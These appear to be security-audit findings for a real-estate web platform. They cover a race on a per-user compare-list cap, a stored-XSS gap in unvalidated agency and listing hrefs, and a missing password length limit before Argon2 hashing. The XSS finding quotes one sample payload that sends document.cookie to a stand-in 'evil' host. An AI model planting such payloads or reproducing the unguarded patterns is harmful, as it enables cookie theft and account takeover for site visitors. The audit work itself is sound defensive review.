backend/servers/reality-server/src/routes/compare.rs:155-227 — add_to_compare is a classic check-then-act (TOCTOU). It SELECT COUNT(*) FROM compare_lists WHERE user_id=$1 (line 166), rejects with 400 if count >= MAX_COMPARE_LISTINGS (==4, line 172), then — after two more SELECTs — INSERTs the row (line 221). The read and the write are separate statements on a pooled connection with NO transaction, NO SELECT ... FOR UPDATE, and NO row/advisory lock. Two concurrent add_to_compare requests from the same authenticated portal user, each adding a DIFFERENT listing while count==3, both read count=3, both pass the `< 4` gate, and both INSERT — leaving 5 (or more under higher concurrency) rows, silently exceeding the documented per-user cap.

backend/crates/db/migrations/00105_create_compare_lists.sql:1-12 — the migration comment states 'max 4 entries enforced in application layer' and the table has NO CHECK constraint, trigger, or any DB-level mechanism bounding rows-per-user. So the cap exists ONLY in the racy application check above; the database will happily persist >4 rows. This confirms the TOCTOU is unprotected for the count invariant (unlike the duplicate invariant, which IS backstopped — see next).

backend/crates/db/migrations/00105_create_compare_lists.sql:11 — CONSTRAINT uq_compare_user_listing UNIQUE (user_id, listing_id) DOES protect data integrity against the separate duplicate-insert race (compare.rs:205-219 checks `already_in` then inserts), so two concurrent adds of the SAME listing cannot create duplicate rows. BUT the losing request's INSERT (compare.rs:221) then fails with a unique violation that is mapped by crate::util::errors::db_error("add to compare list", e) to a generic 500 Internal Server Error, instead of the intended 400 'Listing already in compare list' (compare.rs:214-219). A benign concurrent double-click thus surfaces a 500 — an error-mapping gap on the same handler.

Severity LOW (+1): no auth bypass and no data-integrity corruption (the unique constraint protects uniqueness). Blast radius is a soft UX cap — a user can end up with 5-6 compare entries instead of 4, and a concurrent double-add of one listing returns 500 rather than 400. Confidence medium: the check-then-act propagation is confirmed by static read and the absence of a count-bounding DB constraint is confirmed in the migration; whether the race is hit in practice is traffic/timing-dependent, so the defect is latent rather than runtime-confirmed. Previously-UNFLAGGED location: the only prior TOCTOU/limit findings in the reality-server corpus are code-review-reality-server-favorites-limit-toctou (2026-10-13, handlers/favorites/mod.rs) and favorites-add-error-mapping-500 (2026-10-01) — both on the favorites path; compare.rs has the same two bug classes and has never been flagged for them.

React does not sanitize `javascript:` href values at runtime (it logs a dev-only warning since 16.9 but still renders the attribute), so an agency setting website to `javascript:fetch('//evil/'+document.cookie)` yields a stored-XSS payload that executes in the reality-portal origin when any visitor clicks the "Navštíviť web" link.

frontend/apps/reality-web/src/components/listings/sections/Resources.tsx:17 and :39 - the same raw-href pattern for listing-authored URLs: `href={listing.virtualTourUrl}` and `href={listing.floorPlanUrl}`, both target=_blank anchors with no http(s) scheme check. Same `javascript:` / `data:text/html` vector, authored at listing-edit time.

Project IS aware of the javascript:/data: URL class - lib/tenant-config.ts:243-262 sanitizeCssValue explicitly denylists `javascript:`/`data:`/`url(`/`expression(` for tenant css_vars, and its own comment (:231) notes logo URLs are deliberately routed to a non-executing `<link rel="icon">` to avoid exactly this. That guard is NOT applied to these three user-authored anchor hrefs - no safeExternalHref / isSafeUrl helper exists in reality-web, and grep for scheme checks (`https?:` / `startsWith('http`) over src/ returns only the tenant-config css path. This is the lone gap in an otherwise href-safe app.

Severity MEDIUM (+2): true stored-XSS vector but it requires (i) a semi-trusted authenticated agency/listing author to plant the payload and (ii) a victim click on the rendered link, which bounds blast radius below an unauthenticated reflected XSS. Confidence medium: the raw-href render path is confirmed by static read and React's non-sanitization of href is well established, but this pass did NOT confirm the absence of a server-side scheme validation on agency.website / *Url at write time in reality-server (not in scope for a frontend static pass) - if the backend already rejects non-http(s) schemes on write, this degrades to defense-in-depth. The remedy (an http(s)-only href guard at the three sites) is cheap and correct regardless.

evidence: backend/servers/api-server/src/services/auth.rs:112-132 — AuthService::validate_password enforces a MINIMUM length (>=8) plus uppercase+digit, but imposes NO MAXIMUM length. hash_password (auth.rs:69-77) and verify_password (auth.rs:80-86) pass the raw user-supplied password straight into Argon2id (configured at m_cost=65536 KiB / 64 MiB, t=3 per auth.rs:48-66) with no length ceiling. Every call allocates 64 MiB of memory and does an O(n) Blake2b pre-hash over the full input.

backend/servers/api-server/src/routes/auth/registration.rs:71-72 and routes/auth/password_reset.rs:156-157 — validate_password is only invoked when SETTING a password (registration + reset). The LOGIN path calls verify_password directly with zero length validation, so an UNAUTHENTICATED caller controls the input length on an unauthenticated endpoint. backend/crates/db/src/models/auth_policy.rs:129-133 (per-org PasswordPolicy) likewise only checks min_password_length, never a max — so even the policy layer provides no upper bound.

backend/servers/api-server/src/main.rs:230 — the only backstop is the coarse global DefaultBodyLimit::max(16 * 1024 * 1024) = 16 MiB. That permits a ~16 MiB password string per request, each forcing a 64 MiB Argon2id computation. Unauthenticated login lets an attacker amplify request cost (CPU + 64 MiB RSS spikes under concurrency) with no password-specific size gate — a resource-exhaustion / DoS-hardening gap. Fix: cap password length (e.g. reject > 256–1024 chars) inside validate_password and before verify_password on the login path.

Severity LOW (+1): no auth bypass, no data corruption; Argon2 memory cost is input-length-independent so amplification is modest and bounded by the 16 MiB body limit. Confidence medium: the absence of a max-length check is confirmed by static read of validate_password / verify_password and the login call site; runtime DoS impact is traffic/concurrency dependent, so latent rather than confirmed. Previously-UNFLAGGED: no prior api-core finding covers password length bounds (the only open api-core findings concern workflow-condition error handling).
